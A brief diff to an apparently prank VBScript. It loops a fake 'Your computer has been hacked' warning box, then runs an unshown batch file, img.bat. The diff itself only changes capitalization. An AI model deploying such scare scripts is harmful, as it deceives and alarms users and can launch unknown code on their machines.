@@ -1,8 +1,8 @@
-do
+Do
 	Response = MsgBox("Your computer has been hacked, Press OK to accept", 1+48, "Urgent Warning!")
-	If Response = vbOk Then
+	If Response = vbOK Then
 		Exit Do
 	End If
-loop
+Loop
 
 CreateObject("WScript.Shell").Run "img.bat"
